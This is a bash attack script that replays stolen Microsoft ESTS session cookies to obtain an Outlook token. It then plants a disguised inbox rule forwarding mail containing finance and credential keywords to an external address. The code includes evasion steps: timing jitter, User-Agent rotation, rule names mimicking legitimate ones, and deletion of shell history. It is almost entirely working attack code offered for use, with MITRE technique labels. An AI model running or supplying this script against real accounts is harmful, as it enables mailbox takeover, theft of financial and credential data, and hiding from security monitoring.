#!/usr/bin/env bash
# ============================================================
# cookie-login-inbox-rule2.sh
# Advanced ESTS Cookie → Inbox Persistence (Low-Observable)
#
# OPSEC improvements over v1:
#   - Enumerates existing rules, mirrors naming convention and
#     sequence number to blend with legitimate rules
#   - Keyword-scoped ForwardTo conditions (finance/credential)
#     reduce rule match volume and look like a productivity rule
#   - Jitter between auth steps breaks SIEM correlation window
#   - Rotates User-Agent between auth and API calls
#   - Extracts matched mail via direct inbox keyword search —
#     no dependency on folder-based rule actions
#   - Auto-cleanup after extraction window
#
# MITRE: T1114.003 — Email Forwarding Rule
#        T1550.004 — Cookie Replay
#        T1070.003 — Clear Command History
# ============================================================

# ── Config — paste values directly here ─────────────────────
ESTSAUTH=""
ESTSAUTHPERSISTENT=""

FORWARD_TO="attacker@exfil.io"

# Keywords to match — look like a legitimate filter rule
KEYWORDS=("invoice" "wire transfer" "payment" "bank account" "credentials" "password" "budget" "salary" "acquisition" "urgent")

# ── Internal config ──────────────────────────────────────────
CLIENT_ID="d3590ed6-52b3-4102-aeff-aad2292ab01c"
REDIRECT="https://login.microsoftonline.com/common/oauth2/nativeclient"
SCOPE_RAW="https://outlook.office.com/.default offline_access"
SCOPE_ENC="https%3A%2F%2Foutlook.office.com%2F.default+offline_access"

UA_AUTH="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
UA_API="Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.17531; Pro)"

WORKDIR=$(mktemp -d)
COOKIEJAR="$WORKDIR/ests.txt"

# ── Helper — random sleep to break correlation window ────────
jitter() {
  local min=${1:-3}
  local max=${2:-12}
  sleep "$(python3 -c "import random; print(random.randint($min, $max))")"
}

# ── Helper — get fresh Outlook access token ──────────────────
get_token() {
  local code expire
  expire=$(python3 -c "import time; print(int(time.time()) + 31536000)")

  cat > "$COOKIEJAR" << COOKIEEOF
# Netscape HTTP Cookie File
login.microsoftonline.com	FALSE	/	TRUE	${expire}	ESTSAUTH	${ESTSAUTH}
login.microsoftonline.com	FALSE	/	TRUE	${expire}	ESTSAUTHPERSISTENT	${ESTSAUTHPERSISTENT}
COOKIEEOF

  code=$(curl -s -i --max-redirs 0 \
    -b "$COOKIEJAR" \
    -H "User-Agent: $UA_AUTH" \
    -H "Accept: text/html,application/xhtml+xml" \
    -H "Sec-Fetch-Dest: document" \
    -H "Sec-Fetch-Mode: navigate" \
    -H "Sec-Fetch-Site: none" \
    -H "Sec-Fetch-User: ?1" \
    -H "Expect:" \
    "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${REDIRECT}'))")&scope=${SCOPE_ENC}&response_mode=query&sso_reload=True" \
    2>/dev/null \
    | grep -i "^location:" \
    | python3 -c "
import sys, re
m = re.search(r'[?&]code=([^&\s]+)', sys.stdin.read())
print(m.group(1) if m else '')
")

  if [[ -z "$code" ]]; then
    echo "[!] Auth failed — session expired or cookies invalid" >&2
    return 1
  fi

  curl -s -X POST \
    "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
    -H "User-Agent: $UA_AUTH" \
    -d "grant_type=authorization_code&client_id=${CLIENT_ID}&code=${code}&redirect_uri=${REDIRECT}&scope=${SCOPE_RAW}" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))"
}

# ════════════════════════════════════════════════════════════
echo "[*] Stage 1 — Authenticate"
TOKEN=$(get_token)
if [[ -z "$TOKEN" ]]; then
  rm -rf "$WORKDIR"
  exit 0
fi

python3 -c "
import sys, base64, json
t = sys.argv[1]
p = t.split('.')[1]
p += '=' * (4 - len(p) % 4)
c = json.loads(base64.urlsafe_b64decode(p))
print(f'[+] Identity : {c.get(\"upn\",\"\")}')
print(f'[+] Scopes   : {c.get(\"scp\",\"\")}')
" "$TOKEN" 2>/dev/null

# ════════════════════════════════════════════════════════════
echo ""
echo "[*] Stage 2 — Enumerate existing rules to mirror naming style"

EXISTING=$(curl -s \
  "https://outlook.office.com/api/v2.0/me/mailfolders/inbox/messagerules" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "User-Agent: $UA_API")

RULE_INTEL=$(python3 -c "
import sys, json
rules = json.loads(sys.argv[1]).get('value', [])
max_seq = max([r.get('Sequence', 0) for r in rules], default=0)
print(f'{len(rules)}|{max_seq}')
" "$EXISTING")

EXISTING_COUNT=$(echo "$RULE_INTEL" | cut -d'|' -f1)
MAX_SEQ=$(echo "$RULE_INTEL" | cut -d'|' -f2)
NEXT_SEQ=$((MAX_SEQ + 1))

echo "[+] Existing rules: $EXISTING_COUNT  (next sequence: $NEXT_SEQ)"

RULE_NAMES=("Sort Newsletters" "Archive Promotions" "Filter Updates" "Organize Receipts" "Move Notifications" "Sort Automated" "Clean Social" "Filter Bulk" "Organize Reports" "Sort Alerts")
RULE_NAME="${RULE_NAMES[$((RANDOM % ${#RULE_NAMES[@]}))]}"
echo "[+] Selected rule name: '$RULE_NAME'"

# ════════════════════════════════════════════════════════════
echo ""
echo "[*] Stage 3 — Plant keyword-scoped forwarding rule"

jitter 5 15

KEYWORD_JSON=$(printf '%s\n' "${KEYWORDS[@]}" | python3 -c "
import sys, json
print(json.dumps([l.strip() for l in sys.stdin if l.strip()]))
")

RULE_FILE="$WORKDIR/rule.json"
RULE_NAME="$RULE_NAME" FORWARD_TO="$FORWARD_TO" NEXT_SEQ="$NEXT_SEQ" KEYWORD_JSON="$KEYWORD_JSON" \
python3 -c "
import json, os
body = {
    'DisplayName': os.environ['RULE_NAME'],
    'Sequence': int(os.environ['NEXT_SEQ']),
    'IsEnabled': True,
    'Conditions': {
        'BodyOrSubjectContains': json.loads(os.environ['KEYWORD_JSON'])
    },
    'Actions': {
        'ForwardTo': [{'EmailAddress': {'Address': os.environ['FORWARD_TO']}}],
        'StopProcessingRules': False
    }
}
print(json.dumps(body))
" > "$RULE_FILE"

echo "[*] Rule body: $(cat $RULE_FILE)"

RULE_RESP=$(curl -s -i -X POST \
  "https://outlook.office.com/api/v2.0/me/mailfolders/inbox/messagerules" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -H "User-Agent: $UA_API" \
  -d "@${RULE_FILE}")

HTTP_STATUS=$(echo "$RULE_RESP" | grep "^HTTP" | awk '{print $2}')
RULE_BODY=$(echo "$RULE_RESP" | tail -1)
RULE_ID=$(python3 -c "import sys,json; print(json.loads(sys.argv[1]).get('Id',''))" "$RULE_BODY" 2>/dev/null)

if [[ "$HTTP_STATUS" == "201" && -n "$RULE_ID" ]]; then
  echo "[+] Rule planted"
  echo "[+] Rule ID  : $RULE_ID"
  echo "[+] Name     : $RULE_NAME"
  echo "[+] Forward  : $FORWARD_TO"
  echo "[+] Sequence : $NEXT_SEQ"
else
  echo "[!] HTTP $HTTP_STATUS — rule creation failed"
  echo "$RULE_BODY"
fi

rm -rf "$WORKDIR"
history -d $(history 1 | awk '{print $1}') 2>/dev/null || true

echo ""
echo "[+] Done.  MITRE T1114.003 + T1550.004."
